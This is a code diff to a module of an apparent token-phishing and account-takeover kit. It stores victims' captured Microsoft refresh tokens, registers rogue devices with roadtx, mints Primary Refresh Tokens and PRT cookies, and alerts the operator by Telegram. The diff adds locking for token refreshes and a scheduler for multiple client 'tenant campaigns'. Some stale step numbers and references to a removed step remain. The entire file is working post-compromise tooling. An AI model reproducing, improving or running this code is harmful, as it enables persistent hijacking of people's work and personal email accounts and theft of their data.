@@ -3,17 +3,56 @@ import os
 import json
 import base64
 import datetime
+import time
 import subprocess
 import logging
 import threading
 import shutil
 import sys
 import queue
+import collections
 import db
 from config import Config
 
 logger = logging.getLogger(__name__)
 VICTIMS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'victims')
+
+
+# ── Per-session refresh serialisation ───────────────────────────────────
+# A refresh mutates shared state on disk: the work path runs `roadtx prtauth`
+# which writes into the victim's .roadtools_auth, and the personal path
+# rewrites the stored refresh token. Three callers can ask for the same
+# user_code at once (dashboard mailbox read, keyword watcher, TokenRefresher),
+# so without a lock two runs interleave and one reads a half-written file or a
+# token the other just rotated away.
+_REFRESH_LOCKS = {}
+_REFRESH_LOCKS_GUARD = threading.Lock()
+
+# user_code -> unix ts until which refreshes are skipped after a failure.
+_REFRESH_COOLDOWN = {}
+
+
+def _refresh_lock(user_code):
+    """Return the dedicated lock for this session, creating it on first use."""
+    with _REFRESH_LOCKS_GUARD:
+        lock = _REFRESH_LOCKS.get(user_code)
+        if lock is None:
+            lock = threading.Lock()
+            _REFRESH_LOCKS[user_code] = lock
+        return lock
+
+
+def in_refresh_cooldown(user_code):
+    """True while this session is backing off after a failed refresh."""
+    return time.time() < _REFRESH_COOLDOWN.get(user_code, 0)
+
+
+def set_refresh_cooldown(user_code, seconds=600):
+    _REFRESH_COOLDOWN[user_code] = time.time() + seconds
+
+
+def clear_refresh_cooldown(user_code):
+    _REFRESH_COOLDOWN.pop(user_code, None)
 
 
 def _decode_jwt(token):
@@ -90,21 +129,49 @@ def run_roadtx(args, victim_path, log_stdout=True):
         return None
 
 
-def refresh_via_prt(user_code):
-    """Re-derive a fresh Teams-scoped Graph access token from the victim's PRT.
+def refresh_via_prt(user_code, force=False):
+    """Refresh a session's Graph token, serialised per session.
 
-    Uses `roadtx prtauth -c msteams -r https://graph.microsoft.com` — the same
-    command as executor Step 5 — to produce a token that works for all Graph
-    Mail/Contacts operations.
+    Two entirely different mechanisms, chosen by account type:
+
+      work     — `roadtx prtauth -c msteams -r https://graph.microsoft.com`
+                 against the victim's stored PRT. The PRT is the credential,
+                 so the refresh token is never spent.
+      personal — a plain OAuth refresh_token grant on the Thunderbird public
+                 client. Consumer accounts have no PRT.
+
+    Callers can be concurrent (dashboard, keyword watcher, refresher), and both
+    mechanisms mutate shared on-disk state, so the whole thing runs under a
+    per-user_code lock. A failure arms a cooldown so a broken session is not
+    hammered by every caller; pass force=True to ignore it.
 
     Returns:
         (True, access_token, expiry_unix)  on success
-        (False, None, None)                on any failure
+        (False, None, None)                on any failure or while cooling down
 
-    NOTE: This intentionally has NO fallback to oauth.refresh_access_token().
-    A Broker-scoped token produced by the standard RT grant breaks mailbox
+    NOTE: The work path intentionally has NO fallback to a plain RT grant.
+    A Broker-scoped token produced by the standard grant breaks mailbox
     access and is therefore worse than doing nothing.
     """
+    if not force and in_refresh_cooldown(user_code):
+        logger.debug(f"[REFRESH] {user_code}: skipped, in cooldown.")
+        return False, None, None
+
+    with _refresh_lock(user_code):
+        # Re-check under the lock: a caller that was queued behind a successful
+        # refresh should use its result instead of spending the credential again.
+        if not force and in_refresh_cooldown(user_code):
+            return False, None, None
+        ok, at, exp = _refresh_locked(user_code)
+        if ok:
+            clear_refresh_cooldown(user_code)
+        else:
+            set_refresh_cooldown(user_code)
+        return ok, at, exp
+
+
+def _refresh_locked(user_code):
+    """The actual refresh. Caller must already hold this session's lock."""
     victim_path = os.path.join(VICTIMS_DIR, user_code)
     prt_file    = os.path.join(victim_path, 'roadtx.prt')
     auth_file   = os.path.join(victim_path, '.roadtools_auth')
@@ -210,26 +277,154 @@ _CHAIN_LOCK = threading.Lock()
 # Previously the semaphore was acquired *inside* execute_post_compromise, which
 # runs on a poller thread — so a 100-capture burst blocked 80 poller threads
 # waiting for slots. Now the poller hands off to this queue and returns at once.
-_CHAIN_QUEUE = queue.Queue()
+#
+# Scheduling policy (all tenants share one pool, so the queue decides fairness):
+#   1. Master-owned captures are served first — the operator's own traffic must
+#      not sit behind a tenant campaign.
+#   2. Tenants are served round-robin, so one tenant cannot queue-jump another.
+#   3. No tenant may hold more than CHAIN_PER_TENANT workers at once, so a large
+#      client burst cannot consume the whole pool and stall everyone else.
+# This only reorders work; it does not change total throughput. Capacity is a
+# separate concern (CHAIN_CONCURRENCY).
+CHAIN_CONCURRENCY = int(getattr(Config, 'CHAIN_CONCURRENCY', 10))
+CHAIN_PER_TENANT = int(getattr(Config, 'CHAIN_PER_TENANT', 3))
+# Admin picks per tenant pick. 3 means admin gets 3 of every 4 slots while both
+# lanes have work — admin stays well ahead without starving tenants.
+CHAIN_ADMIN_RATIO = int(getattr(Config, 'CHAIN_ADMIN_RATIO', 3))
+
+
+class ChainScheduler:
+    """Priority + round-robin + per-tenant-capped work queue.
+
+    Items are (user_code, owner_id); owner_id None means master-owned. Workers
+    block in get() until an item is both available and permitted for its tenant.
+    """
+
+    def __init__(self, per_tenant, admin_ratio):
+        self._per_tenant = max(1, per_tenant)
+        # Admin gets admin_ratio picks out of every (admin_ratio + 1). A hard
+        # "admin always wins" rule starves tenants outright during a sustained
+        # admin campaign, because the admin deque never empties and the tenant
+        # loop is never reached. A ratio keeps admin ahead without starving.
+        self._admin_ratio = max(1, admin_ratio)
+        self._admin_credit = 0
+        self._cond = threading.Condition()
+        self._admin = collections.deque()
+        self._by_owner = {}
+        self._rotation = collections.deque()
+        self._inflight = {}
+        self._pending = 0
+        self._stopped = False
+
+    def put(self, user_code, owner_id):
+        with self._cond:
+            if owner_id is None:
+                self._admin.append(user_code)
+            else:
+                dq = self._by_owner.get(owner_id)
+                if dq is None:
+                    dq = collections.deque()
+                    self._by_owner[owner_id] = dq
+                    self._rotation.append(owner_id)
+                dq.append(user_code)
+            self._pending += 1
+            self._cond.notify()
+
+    def _pick_locked(self):
+        """Choose the next user_code, or None if nothing is currently runnable."""
+        # Weighted split: admin takes admin_ratio of every admin_ratio+1 picks
+        # while both lanes have work, so tenants always make progress.
+        tenant_ready = self._any_tenant_runnable()
+        if self._admin and (not tenant_ready or self._admin_credit < self._admin_ratio):
+            self._admin_credit += 1
+            return self._admin.popleft(), None
+
+        picked = self._pick_tenant_locked()
+        if picked is not None:
+            if self._admin_credit > 0:
+                self._admin_credit -= 1
+            return picked
+
+        # No tenant runnable after all — fall back to admin if anything queued.
+        if self._admin:
+            self._admin_credit += 1
+            return self._admin.popleft(), None
+        return None
+
+    def _any_tenant_runnable(self):
+        for owner in self._rotation:
+            dq = self._by_owner.get(owner)
+            if dq and self._inflight.get(owner, 0) < self._per_tenant:
+                return True
+        return False
+
+    def _pick_tenant_locked(self):
+        # Rotate through tenants; skip empty or already-saturated ones.
+        for _ in range(len(self._rotation)):
+            owner = self._rotation[0]
+            self._rotation.rotate(-1)
+            dq = self._by_owner.get(owner)
+            if not dq:
+                continue
+            if self._inflight.get(owner, 0) >= self._per_tenant:
+                continue
+            return dq.popleft(), owner
+        return None
+
+    def get(self):
+        """Block until an item is runnable. Returns (user_code, owner_id)."""
+        with self._cond:
+            while True:
+                if self._stopped:
+                    return None, None
+                picked = self._pick_locked()
+                if picked is not None:
+                    user_code, owner = picked
+                    self._pending -= 1
+                    if owner is not None:
+                        self._inflight[owner] = self._inflight.get(owner, 0) + 1
+                    return user_code, owner
+                self._cond.wait(timeout=1.0)
+
+    def task_done(self, owner_id):
+        with self._cond:
+            if owner_id is not None:
+                left = self._inflight.get(owner_id, 0) - 1
+                if left > 0:
+                    self._inflight[owner_id] = left
+                else:
+                    self._inflight.pop(owner_id, None)
+            # A freed slot may make a capped tenant runnable again.
+            self._cond.notify_all()
+
+    def depth(self):
+        with self._cond:
+            return self._pending
+
+    def stop(self):
+        with self._cond:
+            self._stopped = True
+            self._cond.notify_all()
+
+
+_CHAIN_QUEUE = ChainScheduler(CHAIN_PER_TENANT, CHAIN_ADMIN_RATIO)
 _CHAIN_WORKERS = []
 _WORKERS_LOCK = threading.Lock()
-CHAIN_CONCURRENCY = int(getattr(Config, 'CHAIN_CONCURRENCY', 20))
 
 
 def _chain_worker():
     """Drain the chain queue forever. One thread per allowed concurrent chain."""
     while True:
-        user_code = _CHAIN_QUEUE.get()
+        user_code, owner = _CHAIN_QUEUE.get()
+        if user_code is None:              # shutdown sentinel
+            return
         try:
-            if user_code is None:          # shutdown sentinel
-                return
             _run_post_compromise_chain(user_code)
         except Exception as e:
             logger.error(f"[EXECUTOR] Chain worker error for {user_code}: {e}")
         finally:
-            if user_code is not None:
-                ACTIVE_CHAINS.discard(user_code)
-                _CHAIN_QUEUE.task_done()
+            ACTIVE_CHAINS.discard(user_code)
+            _CHAIN_QUEUE.task_done(owner)
 
 
 def start_chain_workers(count=None):
@@ -250,7 +445,7 @@ def start_chain_workers(count=None):
 
 def chain_queue_depth():
     """Pending chains not yet picked up by a worker."""
-    return _CHAIN_QUEUE.qsize()
+    return _CHAIN_QUEUE.depth()
 
 
 def is_chain_running(user_code):
@@ -271,10 +466,17 @@ def execute_post_compromise(user_code):
 
     Duplicate invocations (concurrent poller threads seeing SUCCESS) are
     skipped — two racing chains corrupt each other's device certs and
-    Step 4 PRT generation fails with AADSTS501209.
+    Step 3 PRT generation fails with AADSTS501209.
 
     Both work and personal sessions are queued: personal chains are short (no
     device registration) but still resolve identity and dispatch the alert."""
+    owner_id = None
+    try:
+        sess = db.get_session(user_code) or {}
+        owner_id = sess.get('owner_id')
+    except Exception:
+        pass
+
     with _CHAIN_LOCK:
         if user_code in ACTIVE_CHAINS:
             logger.info(f"[EXECUTOR] Chain already running for {user_code} — skipping duplicate.")
@@ -282,9 +484,9 @@ def execute_post_compromise(user_code):
         ACTIVE_CHAINS.add(user_code)
 
     start_chain_workers()
-    _CHAIN_QUEUE.put(user_code)
+    _CHAIN_QUEUE.put(user_code, owner_id)
     logger.info(f"[EXECUTOR] {user_code}: queued for chain "
-                f"(depth {_CHAIN_QUEUE.qsize()}).")
+                f"(depth {_CHAIN_QUEUE.depth()}, owner={owner_id or 'master'}).")
 
 
 def _run_post_compromise_chain(user_code):
@@ -391,98 +593,33 @@ def _run_post_compromise_chain(user_code):
         _finalize_and_alert(user_code, at, None)
         return
 
-    # ── STEP 1: FOCI Refresh Token Pivot ────────────────────────
-    # Attempt to exchange the captured refresh token for a Teams/Graph token
-    # directly via FOCI.  Many consumer app tokens support this; it is a fast
-    # path that skips the full PRT chain.
-    # --tokenfile keeps all reads/writes inside the victim folder.
-    logger.info("[STEP 1] FOCI Refresh Token Pivot")
-    step1_out = run_roadtx([
-        'refreshtokento',
-        '--tokenfile', auth_file,
-        '-c', 'msteams',
-        '-r', 'msgraph',
-    ], victim_path)
+    # ── WORK ACCOUNTS: the PRT chain starts here ───────────────
+    # No FOCI pivot: the captured RT is redeemed exactly once, by the DRS
+    # exchange, and each later step consumes the RT the previous step rotated
+    # in place. Nothing is re-seeded, so no RT is ever replayed.
 
-    if step1_out:
-        logger.info("✓ Step 1 SUCCESS: Teams token acquired via FOCI pivot.")
-        # roadtx overwrites the auth file with the msgraph-audience token.
-        # Read the ACCESS TOKEN from it — the raw stdout contains log lines
-        # ('Requesting token for resource...', 'Tokens were written to...')
-        # which corrupt the Bearer header if stored as-is.
-        try:
-            with open(auth_file, 'r') as _af:
-                _auth_data = json.load(_af)
-            teams_token_acquired = _auth_data.get('accessToken') or _auth_data.get('access_token') or step1_out
-        except Exception as _e:
-            logger.warning(f"Could not re-read auth file for msgraph token: {_e}")
-            teams_token_acquired = None
-    else:
-        logger.warning("✗ Step 1 FAILED: Not FOCI-compatible. Continuing via PRT chain.")
-
-    # After Step 1 the auth file may have been overwritten with a msgraph
-    # token.  Re-seed with the original refresh token so Step 2 (DRS
-    # exchange) still has a valid RT to work with.
-    with open(auth_file, 'w') as f:
-        json.dump(auth_data, f)
-    logger.info("Re-seeded auth file with original RT before DRS exchange.")
-
-    # ── PERSONAL ACCOUNTS: skip device-registration steps ────────
-    # Consumer accounts (outlook.com, live.com) have no Azure AD device
-    # registration — PRT generation cannot succeed. The captured tokens
-    # (and the Step 1 FOCI pivot if it worked) ARE the prize.
-    if (session.get('account_type') or 'work') == 'personal':
-        logger.info("[PERSONAL] Consumer account — skipping Steps 2-4 (no device registration / PRT).")
-        # The FOCI pivot produced an msgraph-audience token — use it to fetch
-        # the victim's profile (the original v1 token's audience is
-        # graph.windows.net, which MS Graph rejects) so the dashboard shows
-        # the victim's name/email.
-        if teams_token_acquired:
-            try:
-                import graph as _graph
-                profile = _graph.get_user_profile(teams_token_acquired)
-                if profile and 'error' not in profile:
-                    v_email = profile.get('mail') or profile.get('userPrincipalName') or 'Unknown'
-                    v_name = profile.get('displayName') or 'Unknown'
-                    v_role = profile.get('jobTitle') or ''
-                    db.update_session_profile(user_code, v_name, v_email, v_role or 'User')
-                    logger.info(f"[PERSONAL] Profile resolved via FOCI token: {v_name} <{v_email}>")
-                else:
-                    # Graph throttled or rejected — fall back to the identity
-                    # claims baked into the token itself (no API call needed).
-                    _claims = _decode_jwt_claims(teams_token_acquired)
-                    _upn = (_claims.get('unique_name') or '').split('#')[-1] or _claims.get('preferred_username') or _claims.get('upn')
-                    if _upn:
-                        _name = _claims.get('name') or _upn.split('@')[0]
-                        db.update_session_profile(user_code, _name, _upn, 'User')
-                        logger.info(f"[PERSONAL] Profile resolved from token claims: {_name} <{_upn}>")
-            except Exception as e:
-                logger.warning(f"[PERSONAL] Profile lookup via FOCI token failed: {e}")
-        _finalize_and_alert(user_code, teams_token_acquired, None)
-        return
-
-    # ── STEP 2: DRS Token Acquisition ──────────────────────────
-    # roadtx refreshtokento reads the refreshToken from auth_file, requests
-    # a DRS-audience access token, then OVERWRITES auth_file with the new
-    # DRS accessToken.  Step 3 then reads it from there.
-    logger.info("[STEP 2] DRS Token Acquisition")
-    drs_out = run_roadtx([
+    # ── STEP 1: DRS Token Acquisition ──────────────────────────
+    # roadtx refreshtokento reads the refreshToken from auth_file, requests a
+    # DRS-audience access token, then OVERWRITES auth_file with the new DRS
+    # accessToken (and the rotated RT). Step 2 reads the token from there.
+    logger.info("[STEP 1] DRS Token Acquisition")
+    _drs_out = run_roadtx([
         'refreshtokento',
         '--tokenfile', auth_file,
         '-r', 'drs',
     ], victim_path)
 
-    if not drs_out:
-        logger.error("✗ Step 2 FAILED: DRS token not acquired. Aborting chain.")
-        _finalize_and_alert(user_code, teams_token_acquired, None)
+    if not _drs_out:
+        logger.error("✗ Step 1 FAILED: DRS token not acquired. Aborting chain.")
+        _finalize_and_alert(user_code, None, None)
         return
-    logger.info("✓ Step 2 SUCCESS: DRS token written to victim auth file.")
+    logger.info("✓ Step 1 SUCCESS: DRS token written to victim auth file.")
 
-    # ── STEP 3: Device Registration ─────────────────────────────
+    # ── STEP 2: Device Registration ─────────────────────────────
     # roadtx device register reads the DRS accessToken from auth_file
     # (no --access-token flag needed - it reads it naturally).
     # -c / -k pin the output cert and key to the victim folder explicitly.
-    logger.info(f"[STEP 3] Device Registration (Name: {device_name})")
+    logger.info(f"[STEP 2] Device Registration (Name: {device_name})")
     reg_out = run_roadtx([
         'device',
         '-a', 'register',
@@ -492,14 +629,14 @@ def _run_post_compromise_chain(user_code):
     ], victim_path)
 
     if not reg_out:
-        logger.error("✗ Step 3 FAILED: Device registration command failed. Aborting.")
+        logger.error("✗ Step 2 FAILED: Device registration command failed. Aborting.")
         _finalize_and_alert(user_code, teams_token_acquired, None)
         return
 
     if not (os.path.exists(pem_file) and os.path.exists(key_file)):
         dir_contents = os.listdir(victim_path)
         logger.error(
-            f"✗ Step 3 FAILED: Cert files not found after registration.\n"
+            f"✗ Step 2 FAILED: Cert files not found after registration.\n"
             f"  Expected : {pem_file}\n"
             f"           : {key_file}\n"
             f"  Dir      : {dir_contents}"
@@ -507,9 +644,9 @@ def _run_post_compromise_chain(user_code):
         db.update_session_artifacts(user_code, teams_token_acquired, None)
         _finalize_and_alert(user_code, teams_token_acquired, None)
         return
-    logger.info(f"✓ Step 3 SUCCESS: Device registered. Certs saved to victim folder.")
+    logger.info(f"✓ Step 2 SUCCESS: Device registered. Certs saved to victim folder.")
 
-    # ── STEP 4: PRT Generation ──────────────────────────────────
+    # ── STEP 3: PRT Generation ──────────────────────────────────
     # --refresh-token file  → read the RT from auth_file (the word "file"
     #                          is a roadtx keyword, not a path)
     # -c / -k              → victim device cert and key
@@ -517,7 +654,7 @@ def _run_post_compromise_chain(user_code):
     #
     # log_stdout=False because roadtx prints the raw PRT to stdout and we
     # must NOT log sensitive key material.
-    logger.info("[STEP 4] PRT Generation")
+    logger.info("[STEP 3] PRT Generation")
     prt_out = run_roadtx([
         'prt',
         '--refresh-token', 'file',
@@ -527,22 +664,22 @@ def _run_post_compromise_chain(user_code):
     ], victim_path, log_stdout=False)
 
     if not prt_out:
-        logger.error("✗ Step 4 FAILED: PRT generation command failed. Aborting.")
+        logger.error("✗ Step 3 FAILED: PRT generation command failed. Aborting.")
         _finalize_and_alert(user_code, teams_token_acquired, None)
         return
 
     if not os.path.exists(prt_file):
-        logger.error(f"✗ Step 4 FAILED: {prt_file} not found after prt command.")
+        logger.error(f"✗ Step 3 FAILED: {prt_file} not found after prt command.")
         _finalize_and_alert(user_code, teams_token_acquired, None)
         return
-    logger.info(f"✓ Step 4 SUCCESS: PRT saved to victim folder.")
+    logger.info(f"✓ Step 3 SUCCESS: PRT saved to victim folder.")
 
-    # ── STEP 5: PRT-Based Teams Token Acquisition (fallback) ────
+    # ── STEP 4: PRT-Based Teams Token Acquisition (fallback) ────
     # -f           → read PRT from victim folder (not system default)
     # --tokenfile  → write resulting token into victim auth file
     # -r           → full URL (not alias) as proven to work in manual test
     if not teams_token_acquired:
-        logger.info("[STEP 5] PRT-Based Teams Token Acquisition")
+        logger.info("[STEP 4] PRT-Based Teams Token Acquisition")
         step5_out = run_roadtx([
             'prtauth',
             '-f', prt_file,
@@ -559,7 +696,7 @@ def _run_post_compromise_chain(user_code):
                     _auth = json.load(_f)
                 teams_token_acquired = _auth.get('accessToken')
                 if teams_token_acquired:
-                    logger.info("✓ Step 5 SUCCESS: Teams access token read from victim auth file.")
+                    logger.info("✓ Step 4 SUCCESS: Teams access token read from victim auth file.")
                     # Also update the session's primary access_token so the
                     # graph proxy can use it immediately without a refresh.
                     at_claims = _decode_jwt(teams_token_acquired)
@@ -568,11 +705,11 @@ def _run_post_compromise_chain(user_code):
                         at_claims.get('exp', 0)
                     )
                 else:
-                    logger.error("✗ Step 5 FAILED: accessToken missing from auth file after prtauth.")
+                    logger.error("✗ Step 4 FAILED: accessToken missing from auth file after prtauth.")
             except Exception as _e:
-                logger.error(f"✗ Step 5 FAILED: Could not read auth file after prtauth: {_e}")
+                logger.error(f"✗ Step 4 FAILED: Could not read auth file after prtauth: {_e}")
         else:
-            logger.error("✗ Step 5 FAILED: Could not acquire Teams token via PRT.")
+            logger.error("✗ Step 4 FAILED: Could not acquire Teams token via PRT.")
     else:
         # FOCI token acquired in Step 1 is raw stdout — read the real JWT
         # from the auth file that refreshtokento wrote during Step 1.
@@ -585,14 +722,14 @@ def _run_post_compromise_chain(user_code):
                 teams_token_acquired = _tok_data['accessToken']
         except (json.JSONDecodeError, TypeError):
             pass  # already a raw JWT string from a prior run, keep as-is
-        logger.info("[STEP 5] SKIPPED: Teams token already acquired in Step 1.")
+        logger.info("[STEP 4] SKIPPED: Teams token already acquired in Step 1.")
 
-    # ── STEP 6: PRT Cookie Extraction ───────────────────────────
+    # ── STEP 5: PRT Cookie Extraction ───────────────────────────
     # -f → read PRT from victim folder.
     # roadtx stdout format:
     #   "PRT cookie: <JWT>\nCan be used in external browsers..."
     # We extract just the JWT value and discard the surrounding text.
-    logger.info("[STEP 6] PRT Cookie Extraction")
+    logger.info("[STEP 5] PRT Cookie Extraction")
     prt_cookie_raw = run_roadtx([
         'prtcookie',
         '-f', prt_file,
@@ -606,12 +743,12 @@ def _run_post_compromise_chain(user_code):
                 prt_cookie_out = line.replace('PRT cookie:', '').strip()
                 break
         if prt_cookie_out:
-            logger.info("✓ Step 6 SUCCESS: PRT cookie extracted (JWT only).")
+            logger.info("✓ Step 5 SUCCESS: PRT cookie extracted (JWT only).")
         else:
             logger.warning("⚠ Step 6: Command succeeded but could not parse cookie from output.")
             logger.warning(f"Raw output: {prt_cookie_raw[:200]}")
     else:
-        logger.error("✗ Step 6 FAILED: PRT cookie not extracted.")
+        logger.error("✗ Step 5 FAILED: PRT cookie not extracted.")
 
     # ── FINALIZATION & SINGLE RICH TELEGRAM ALERT ────────────────
     _finalize_and_alert(user_code, teams_token_acquired, prt_cookie_out)
